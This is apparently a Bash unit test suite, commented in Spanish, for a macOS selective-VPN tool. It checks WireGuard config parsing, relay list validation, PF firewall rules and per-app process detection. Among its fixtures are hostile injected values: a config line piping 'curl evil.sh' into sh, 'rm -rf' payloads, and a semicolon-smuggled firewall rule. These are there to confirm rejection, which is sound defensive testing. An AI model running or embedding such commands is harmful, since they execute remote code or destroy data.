#!/bin/bash
# shellcheck disable=SC2034  # variables usadas por el código de vsctl cargado con source
# Pruebas unitarias de la lógica de vsctl, sin root y sin tocar el sistema:
# se carga una copia con rutas temporales y comandos del sistema simulados.
# uso: tests/unit.sh [ruta/a/wg]   (wg real opcional, para generar claves)
set -uo pipefail
KIT="$(cd "$(dirname "$0")/.." && pwd)"
T=$(mktemp -d "${TMPDIR:-/tmp}/vs-unit.XXXXXX")
trap 'rm -rf "$T"' EXIT
WGBIN="${1:-$KIT/build/bin/wg}"
fails=0; n=0
ok()  { n=$((n + 1)); echo "ok    $*"; }
bad() { n=$((n + 1)); fails=$((fails + 1)); echo "FALLO $*"; }
check() { local d="$1"; shift; if "$@"; then ok "$d"; else bad "$d"; fi; }

# Copia de vsctl: rutas temporales, sin comprobación de root, sin despacho final.
sed -e "s#^BASE=/Library/VPNSelectivo#BASE=$T/base#" \
    -e "s#^RUN=/var/run/vpnselectivo#RUN=$T/run#" \
    -e "s#^LOG=/Library/Logs/VPNSelectivo.log#LOG=$T/log#" \
    -e '/^\[ "\$(id -u)" = 0 \]/d' \
    -e '/^read_config$/d' \
    "$KIT/src/engine/vsctl" | sed '/^case "\${1:-}" in$/,$d' > "$T/vsctl.lib"
mkdir -p "$T/base/etc/servers" "$T/run/tunnel"

# Simulaciones de comandos del sistema
dscl() { echo "PrimaryGroupID: 7350"; }
stat() { if [ "$2" = '%u' ]; then echo 0; elif [ "$2" = '%Lp' ]; then echo 600; else command stat "$@"; fi; }
chown() { :; }
ifconfig() {
    case "$1" in
        -l) echo "lo0 gif0 en0 en1 utun0 utun9 bridge0" ;;
        -a) printf 'en0: flags=8863<UP>\n\tinet 192.168.1.20 netmask 0xffffff00 broadcast 192.168.1.255\nen1: flags=1\n\tinet 100.70.1.2 netmask 0xffc00000\nutun9: flags=1\n\tinet 10.66.1.2 --> 10.66.1.2 netmask 0xffffffff\n' ;;
        *) return 1 ;;
    esac
}
ipconfig() { [ "$2" = en0 ] && echo 192.168.1.1; }
route() { echo "   gateway: 192.168.1.1"; }
PS_FIXTURE=""   # columnas: pid ppid uid rgid ruta
ps() { if [[ "$*" == *ppid* ]]; then printf '%s\n' "$PS_FIXTURE"
       else printf '%s\n' "$PS_FIXTURE" | awk '{ $2 = ""; sub(/  +/, " "); print }'; fi; }

# shellcheck disable=SC1091
source "$T/vsctl.lib"
VS_USER=tester; VS_UID=501; VS_GID=7350

# ── validadores ─────────────────────────────────────────────────────────────
if [ -x "$WGBIN" ]; then PK=$("$WGBIN" genkey); PUB=$(echo "$PK" | "$WGBIN" pubkey)
else PK="dW5pdC10ZXN0LXByaXZhdGUta2V5LTAwMDAwMDAwMDE="; PUB="dW5pdC10ZXN0LXB1YmxpYy1rZXktMDAwMDAwMDAwMDI="; fi   # claves sintéticas
check "clave privada válida" valid_key "$PK"
check "clave pública válida" valid_key "$PUB"
check "clave con último carácter imposible se rechaza" bash -c "$(declare -f valid_key); ! valid_key 'dW5pdC10ZXN0LXB1YmxpYy1rZXktMDAwMDAwMDAwMDB='"
check "IPv4 válida" valid_ipv4 10.66.1.2
check "IPv4 con octeto 256 se rechaza" bash -c "! { $(declare -f valid_ipv4); valid_ipv4 10.66.1.256; }"
check "etiqueta con barra se rechaza" bash -c "! { $(declare -f valid_label); valid_label 'a/b'; }"
check "interfaz utun válida" valid_if utun12
check "interfaz en0 se rechaza" bash -c "! { $(declare -f valid_if); valid_if en0; }"

# ── parser de configuraciones de Mullvad ────────────────────────────────────
SERVERS="$T/base/etc/servers"
printf '[Interface]\r\n# Device: Test\r\nPrivateKey = %s\r\nAddress = 10.66.1.2/32,fc00:bbbb:bbbb:bb01::3:1a2b/128\r\nDNS = 10.64.0.1\r\n\r\n[Peer]\r\nPublicKey = %s\r\nAllowedIPs = 0.0.0.0/0,::0/0\r\nEndpoint = 198.51.100.15:51820\r\n' \
    "$PK" "$PUB" > "$T/se-sto-wg-002.conf"
check "importa .conf de Mullvad con CRLF" parse_conf_into "$T/se-sto-wg-002.conf" se-sto-wg-002 2>/dev/null
check "normaliza los 4 campos" grep -qx "ENDPOINT=198.51.100.15:51820" "$SERVERS/se-sto-wg-002.conf"
check "toma la IPv4 /32 e ignora la IPv6" grep -qx "ADDRESS4=10.66.1.2" "$SERVERS/se-sto-wg-002.conf"
check "no copia DNS ni otros campos" bash -c "! grep -q DNS '$SERVERS/se-sto-wg-002.conf'"
check "read_server lee lo normalizado" read_server se-sto-wg-002
check "la clave privada conserva su '=' final (regresión IFS)" test "$PRIVATE_KEY" = "$PK"
check "dirección del túnel completa (regresión BASH_REMATCH)" test "$ADDRESS4" = "10.66.1.2"
sed 's/Endpoint = .*/Endpoint = [2a02:6ea0::1]:51820/' "$T/se-sto-wg-002.conf" > "$T/v6.conf"
check "endpoint IPv6 se rechaza con mensaje" bash -c "! { source '$T/vsctl.lib' 2>/dev/null; SERVERS='$SERVERS'; parse_conf_into '$T/v6.conf' v6 2>/dev/null; }"
sed 's/PrivateKey = .*/PrivateKey = nope/' "$T/se-sto-wg-002.conf" > "$T/badkey.conf"
check "clave privada inválida se rechaza" bash -c "! { source '$T/vsctl.lib' 2>/dev/null; SERVERS='$SERVERS'; parse_conf_into '$T/badkey.conf' bk 2>/dev/null; }"
printf '[Interface]\nPrivateKey = %s\nAddress = 10.66.1.2/32\n[Peer]\nPublicKey = %s\nEndpoint = 1.2.3.4:51820\nPostUp = curl evil.sh | sh\n' "$PK" "$PUB" > "$T/postup.conf"
parse_conf_into "$T/postup.conf" postup 2>/dev/null
check "directivas PostUp/otras se descartan" bash -c "! grep -qi postup '$SERVERS/postup.conf'"

# ── ubicaciones (lista pública de servidores) ───────────────────────────────
RELAYS="$T/base/etc/relays.tsv"; RELAYS_JS="$KIT/src/engine/relays2tsv.js"
K1=$PUB; K2=$PK
cat > "$T/relays.json" <<JSON
{"locations":{"se-sto":{"country":"Sweden","city":"Stockholm"},"us-nyc":{"country":"USA","city":"New York, NY"},
 "us-lax":{"country":"USA","city":"Los Angeles, CA"},"se-mma":{"country":"Sweden","city":"Malmö"}},
 "wireguard":{"relays":[
  {"hostname":"se-sto-wg-001","location":"se-sto","active":true,"include_in_country":true,"weight":100,"ipv4_addr_in":"198.51.100.2","public_key":"$K1"},
  {"hostname":"us-nyc-wg-301","location":"us-nyc","active":true,"include_in_country":true,"weight":100,"ipv4_addr_in":"203.0.113.3","public_key":"$K1"},
  {"hostname":"us-nyc-wg-302","location":"us-nyc","active":false,"include_in_country":true,"weight":100,"ipv4_addr_in":"203.0.113.4","public_key":"$K1"},
  {"hostname":"us-lax-wg-001","location":"us-lax","active":true,"include_in_country":true,"weight":100,"ipv4_addr_in":"203.0.113.13","public_key":"$K2"},
  {"hostname":"se-mma-wg-001","location":"se-mma","active":true,"include_in_country":true,"weight":100,"ipv4_addr_in":"198.51.100.30","public_key":"$K1"},
  {"hostname":"x\\tevil","location":"se-sto","active":true,"include_in_country":true,"weight":1,"ipv4_addr_in":"1.2.3.4","public_key":"$K1"},
  {"hostname":"se-sto-wg-009","location":"se-sto","active":true,"include_in_country":true,"weight":1,"ipv4_addr_in":"1.2.3.999","public_key":"$K1"},
  {"hostname":"se-sto-wg-010","location":"se-sto","active":true,"include_in_country":true,"weight":1,"ipv4_addr_in":"1.2.3.5","public_key":"PostUp = rm -rf"}
 ]}}
JSON
curl() { local o=""; while [ $# -gt 0 ]; do [ "$1" = -o ] && o="$2"; shift; done; cp "$T/relays.json" "$o"; }
chmod() { command chmod "$@" 2>/dev/null; true; }; mv() { command mv "$@"; }
RUN="$T/run"
out=$(relays_update 2>/dev/null)
check "lista con <50 servidores válidos se rechaza" bash -c "[ -z '$out' ] && [ ! -f '$RELAYS' ]"
# para el resto, aceptar la lista pequeña bajando el mínimo en una copia
eval "$(declare -f relays_update | sed 's/-lt 50/-lt 3/')"
relays_update >/dev/null 2>&1
check "lista válida guardada (5 servidores; 3 entradas manipuladas descartadas)" test "$(grep -c . "$RELAYS")" = 5
check "conserva nombres UTF-8 (Malmö)" grep -q 'Malmö' "$RELAYS"
check "candidato para servidor concreto" test "$(candidates us-nyc-wg-301 | cut -d' ' -f1)" = us-nyc-wg-301
check "ciudad: solo servidores activos" test "$(candidates us-nyc | cut -d' ' -f1 | sort | tr '\n' ' ')" = "us-nyc-wg-301 "
check "país: todas sus ciudades" test "$(candidates us | cut -d' ' -f1 | sort | tr '\n' ' ')" = "us-lax-wg-001 us-nyc-wg-301 "
check "endpoint con puerto 51820" test "$(candidates se-sto | cut -d' ' -f2)" = "198.51.100.2:51820"
check "servidor inactivo no es candidato" bash -c "! { $(declare -f candidates relays_ok safe_root_file read_server valid_key valid_ipv4 identity_label valid_label); RELAYS='$RELAYS'; SERVERS='$SERVERS'; candidates us-nyc-wg-302 | grep -q .; }"
check "país inexistente no cae en otro servidor" bash -c "! { $(declare -f candidates relays_ok safe_root_file read_server valid_key valid_ipv4 identity_label valid_label stat); RELAYS='$RELAYS'; SERVERS='$SERVERS'; candidates zz | grep -q .; }"
echo us > "$T/base/etc/selected"; ETC="$T/base/etc"
check "selected_value acepta código de país" test "$(selected_value)" = us
echo zz-qqq > "$T/base/etc/selected"
check "selección desconocida vuelve a la identidad importada" test "$(selected_value)" = "$(identity_label)"

# ── reglas PF generadas ─────────────────────────────────────────────────────
ALLOW_LAN=0
rules_block=$(gen_rules block)
check "modo bloqueo: bloquea todo el grupo" grep -qx 'block return out quick on ! lo0 from any to any group 7350' <<< "$rules_block"
check "modo bloqueo: sin route-to" bash -c "! grep -q route-to <<< '$rules_block'"
check "guardia del SOCKS de Mullvad en interfaces físicas" grep -qx 'block return out quick on { en0 en1 bridge0 } inet proto tcp from any to 10.64.0.1 port 1080' <<< "$rules_block"
echo utun9 > "$TUN/ifname"; echo 10.66.1.2 > "$TUN/ip"
rules_route=$(gen_rules route)
check "modo túnel: route-to al utun con la IP del túnel" grep -qx 'pass out quick on ! lo0 route-to (utun9 10.66.1.2) inet proto { tcp udp } from any to any group 7350 keep state' <<< "$rules_route"
first=$(grep -v '^#' <<< "$rules_route" | head -n1); last_g=$(grep -n 'group 7350$' <<< "$rules_route" | tail -n1 | cut -d: -f1)
check "route-to va ANTES del bloqueo final" bash -c "[[ '$first' == *route-to* ]] && [ ${last_g:-0} -gt 1 ]"
echo 'utun9; pass all' > "$TUN/ifname"
check "interfaz manipulada en el estado → no genera reglas" bash -c "! { source '$T/vsctl.lib' 2>/dev/null; TUN='$TUN'; VS_GID=7350; ALLOW_LAN=0; gen_rules route >/dev/null; }"
echo utun9 > "$TUN/ifname"
ALLOW_LAN=1
rules_lan=$(gen_rules route)
check "LAN: router 192.168.1.1 bloqueado" grep -qx 'block return out quick on ! lo0 inet from any to 192.168.1.1 group 7350' <<< "$rules_lan"
check "LAN: subred 192.168.1.0/24 permitida desde la IP propia" grep -qx 'pass out quick on ! lo0 inet proto { tcp udp } from 192.168.1.20 to 192.168.1.0/24 group 7350 keep state' <<< "$rules_lan"
check "LAN: 100.64/10 (CGNAT, no privada RFC1918) NO se permite" bash -c "! grep -q '100.64' <<< '$rules_lan'"
check "LAN: bloqueo del router antes que el permiso de la subred" bash -c "[ \$(grep -n '192.168.1.1 group' <<< '$rules_lan' | cut -d: -f1) -lt \$(grep -n '192.168.1.0/24' <<< '$rules_lan' | cut -d: -f1) ]"
ALLOW_LAN=0

# ── apps protegidas (apps.conf) ─────────────────────────────────────────────
APPS_CONF="$T/base/etc/apps.conf"
cat > "$APPS_CONF" <<'CONF'
# id | Nombre | Ruta | args
stremio | Stremio | /Applications/Stremio.app | | 0
brave | Brave | /Applications/Brave Browser.app |
brave-private | Brave Privado | /Applications/Brave Browser.app | --incognito | 1
evil | Ev"il | /Applications/X.app |
evil2 | Evil2 | /Applications/../etc/X.app |
evil3 | Evil3 | /Applications/Y.app | --ok ; rm -rf /
Bad_ID | Bad | /Applications/Z.app |
CONF
bundle_key() {   # simulación del Info.plist de cada app
    case "$1:$2" in
        */Stremio.app:CFBundleExecutable) echo Stremio ;;  */Stremio.app:CFBundleIdentifier) echo com.stremio.pal ;;
        */"Brave Browser.app":CFBundleExecutable) echo "Brave Browser" ;;  */"Brave Browser.app":CFBundleIdentifier) echo com.brave.Browser ;;
        *:CFBundleExecutable) echo X ;; *:CFBundleIdentifier) echo com.example.x ;;
    esac
}
load_apps 2>/dev/null
check "apps.conf: 3 entradas válidas, 4 manipuladas descartadas" test "${#APP_ID[@]}" = 3
check "apps.conf: argumentos de Brave Privado" test "${APP_ARGS[2]}" = "--incognito"
check "apps.conf: Auto-VPN por app (0 explícito, 1 por defecto)" test "${APP_AUTO[0]}${APP_AUTO[1]}${APP_AUTO[2]}" = "011"
check "apps con Auto-VPN: solo Brave" test "$(auto_paths)" = "/Applications/Brave Browser.app"
check "apps.conf: ejecutable resuelto desde Info.plist" test "${APP_EXE[1]}" = "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser"
check "rutas únicas por app (Brave una vez)" test "$(unique_paths | grep -c .)" = 2
check "app_index encuentra brave-private" test "$(app_index brave-private)" = 2
check "id con mayúsculas se rechaza" bash -c "! { $(declare -f valid_app_id); valid_app_id Bad_ID; }"
check "nombre con comillas se rechaza" bash -c "! { $(declare -f valid_app_name); valid_app_name 'a\"b'; }"
check "ruta fuera de /Applications se rechaza" bash -c "! { $(declare -f valid_app_path); valid_app_path /tmp/X.app; }"
check "ruta con .. se rechaza" bash -c "! { $(declare -f valid_app_path); valid_app_path '/Applications/../X.app'; }"
check "ruta en ~/Applications se acepta" bash -c "$(declare -f valid_app_path); valid_app_path '/Users/ana/Applications/Discord.app'"
check "argumento con ; se rechaza" bash -c "! { $(declare -f valid_app_args); valid_app_args '--a ;'; }"
check "reabrir: proceso con --incognito → brave-private" test "$(entry_for_stray '/Applications/Brave Browser.app' '/x/Brave Browser --incognito')" = brave-private
check "reabrir: proceso sin argumentos → brave" test "$(entry_for_stray '/Applications/Brave Browser.app' '/x/Brave Browser')" = brave

# ── detección de procesos fuera de la VPN ───────────────────────────────────
B="/Applications/Brave Browser.app"
FW="$B/Contents/Frameworks/Brave Browser Framework.framework/Versions/156.1.98.60/Helpers"
PS_FIXTURE="  100     1   501  7350 $B/Contents/MacOS/Brave Browser
  101   100   501  7350 $FW/Brave Browser Helper (Renderer).app/Contents/MacOS/Brave Browser Helper (Renderer)
  200     1   501    20 $B/Contents/MacOS/Brave Browser
  201     1   501    20 $FW/chrome_crashpad_handler
  202     1   501    20 $FW/BraveUpdater.app/Contents/MacOS/BraveUpdater
  203     1   501    20 $FW/Brave Browser Helper (Alerts).app/Contents/MacOS/Brave Browser Helper (Alerts)
  300     1   501    20 /Applications/Stremio.app/Contents/Resources/node
  301     1   501  7350 /Applications/Stremio.app/Contents/MacOS/Stremio
  400     1   501    20 /Applications/Google Chrome.app/Contents/MacOS/Google Chrome
  500     1   502    20 $B/Contents/MacOS/Brave Browser
  600     1   501    20 /Applications/Stremio Extra.app/Contents/MacOS/Stremio Extra
  700   200   501    20 $FW/Brave Browser Helper (Renderer).app/Contents/MacOS/Brave Browser Helper (Renderer)"
strays=$(stray_pids any | tr '\n' ' ')
check "detecta Brave, su crashpad y su helper lanzados por fuera, y node de Stremio" test "$strays" = "200 201 300 700 "
check "no toca actualizador ni notificaciones de Brave" bash -c "[[ ' $strays' != *' 202 '* && ' $strays' != *' 203 '* ]]"
check "no toca Chrome, otros usuarios ni apps con nombre parecido" bash -c "[[ ' $strays' != *' 400 '* && ' $strays' != *' 500 '* && ' $strays' != *' 600 '* ]]"
check "filtra por app" test "$(stray_pids /Applications/Stremio.app | tr '\n' ' ')" = "300 "
check "cuenta procesos protegidos" test "$(count_group)" = 3
check "apps protegidas abiertas (una por app)" test "$(running_apps)" = "stremio,brave"
GRACE="$T/run/grace"; printf '200\n201\n' > "$GRACE"
check "gracia: un Brave abierto antes de marcarlo y sus hijos no se terminan" test "$(stray_pids any | tr '\n' ' ')" = "300 "
check "gracia: abrirlo protegido sí los incluye (all)" test "$(stray_pids any all | tr '\n' ' ')" = "200 201 300 700 "
: > "$GRACE"
AUTO_FILE="$T/base/etc/auto-vpn"
check "Auto-VPN global activado por defecto" auto_vpn_on
check "procesos de apps con Auto-VPN en el grupo (Brave: 2)" test "$(auto_group_count)" = 2
echo 0 > "$AUTO_FILE"
check "Auto-VPN global apagado → no cuenta" test "$(auto_group_count)" = 0
rm -f "$AUTO_FILE"
cp "$APPS_CONF" "$T/apps.bak"
mv() { command mv "$@"; }; mktemp() { command mktemp "$@"; }
app_auto brave 0 >/dev/null 2>&1; APPS_MTIME=""; load_apps 2>/dev/null
check "app-auto aplica a todas las entradas de la app (Brave y Brave Privado)" test "${APP_AUTO[1]}${APP_AUTO[2]}" = "00"
check "app-auto no toca otras apps ni comentarios" bash -c "grep -q '^# id' '$APPS_CONF' && grep -q 'Stremio.app | | 0' '$APPS_CONF'"
cp "$T/apps.bak" "$APPS_CONF"; APPS_MTIME=""; load_apps 2>/dev/null
check "detecta Brave principal dentro del grupo" group_main_running "$B/Contents/MacOS/Brave Browser"
check "Chrome no está en el grupo" bash -c "! { $(declare -f group_main_running proc_table ps); PS_FIXTURE='$PS_FIXTURE'; VS_GID=7350; group_main_running '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'; }"
APP_ID=(); APP_PATH=(); APP_EXE=(); APP_ARGS=(); APP_NAME=()
check "sin apps configuradas no se toca nada" test -z "$(stray_pids any)"

echo; echo "$((n - fails))/$n pruebas superadas"
[ "$fails" = 0 ]
